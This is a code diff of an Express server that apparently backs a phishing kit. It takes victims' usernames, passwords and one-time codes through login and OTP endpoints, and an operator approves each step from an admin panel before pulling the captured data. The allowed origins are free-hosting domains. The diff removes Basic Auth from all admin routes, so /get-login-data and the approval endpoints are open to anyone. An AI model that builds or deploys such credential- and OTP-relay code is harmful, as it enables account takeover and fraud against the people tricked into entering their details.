@@ -5,16 +5,15 @@ require('dotenv').config();
 
 const app = express();
 
-// ✅ Custom CORS setup with allowed domains
 const allowedOrigins = [
   'https://ppan001.42web.io',
-  'https://wf011.ct.ws',
-  'http://localhost:3000', // for local testing
+  'https://wf1055.rf.gd',
+  'http://localhost:3000',
 ];
 
 app.use(cors({
   origin: function (origin, callback) {
-    if (!origin) return callback(null, true); // allow requests like Postman
+    if (!origin) return callback(null, true);
     if (allowedOrigins.includes(origin)) {
       return callback(null, true);
     } else {
@@ -29,30 +28,6 @@ app.use(cors({
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ✅ Environment variables for credentials
-const ADMIN_USER = process.env.ADMIN_USER;
-const ADMIN_PASS = process.env.ADMIN_PASS;
-
-// Basic Auth middleware for admin panel
-const basicAuth = (req, res, next) => {
-  const authHeader = req.headers.authorization;
-  if (!authHeader) {
-    res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
-    return res.status(401).send('Authentication required.');
-  }
-
-  const base64Credentials = authHeader.split(' ')[1];
-  const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
-  const [username, password] = credentials.split(':');
-
-  if (username === ADMIN_USER && password === ADMIN_PASS) {
-    return next();
-  } else {
-    res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
-    return res.status(401).send('Invalid credentials.');
-  }
-};
-
 // State variables
 let loginData = null;
 let approved = false;
@@ -61,18 +36,14 @@ let otpApproved = false;
 /* ==============================
    USER ROUTES
 ============================== */
-
-// Serve main page
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Serve admin panel (protected)
-app.get('/admin', basicAuth, (req, res) => {
+app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-// Handle login submission
 app.post('/simulate-login', (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) {
@@ -85,12 +56,11 @@ app.post('/simulate-login', (req, res) => {
   res.json({ message: 'Login data submitted' });
 });
 
-// ✅ Public endpoint for client to check approval status (no auth required)
+// Public check for frontend
 app.get('/check-approval', (req, res) => {
   res.json({ approved });
 });
 
-// Handle OTP submission
 app.post('/submit-otp', (req, res) => {
   const { otp } = req.body;
   if (!loginData) {
@@ -105,7 +75,6 @@ app.post('/submit-otp', (req, res) => {
   res.json({ message: 'OTP submitted successfully' });
 });
 
-// Verify OTP (final step)
 app.post('/verify-otp', (req, res) => {
   if (!loginData) {
     return res.status(400).json({ success: false, message: 'No login data submitted' });
@@ -120,11 +89,9 @@ app.post('/verify-otp', (req, res) => {
 });
 
 /* ==============================
-   ADMIN ROUTES (protected)
+   ADMIN ROUTES (no Basic Auth)
 ============================== */
-
-// Approve login
-app.post('/approve-login', basicAuth, (req, res) => {
+app.post('/approve-login', (req, res) => {
   if (!loginData) {
     return res.status(400).json({ message: 'No login data to approve' });
   }
@@ -133,8 +100,7 @@ app.post('/approve-login', basicAuth, (req, res) => {
   res.json({ message: 'Login approved' });
 });
 
-// Approve OTP
-app.post('/approve-otp', basicAuth, (req, res) => {
+app.post('/approve-otp', (req, res) => {
   if (!loginData || !loginData.otp) {
     return res.status(400).json({ message: 'No OTP data to approve' });
   }
@@ -143,8 +109,7 @@ app.post('/approve-otp', basicAuth, (req, res) => {
   res.json({ message: 'OTP approved' });
 });
 
-// Reset login session
-app.post('/reset-login', basicAuth, (req, res) => {
+app.post('/reset-login', (req, res) => {
   console.log('🔁 Login session reset by admin.');
   loginData = null;
   approved = false;
@@ -152,8 +117,7 @@ app.post('/reset-login', basicAuth, (req, res) => {
   res.json({ message: 'Login reset successfully' });
 });
 
-// Get full login data (admin only)
-app.get('/get-login-data', basicAuth, (req, res) => {
+app.get('/get-login-data', (req, res) => {
   res.json({ loginData, approved, otpApproved });
 });
 
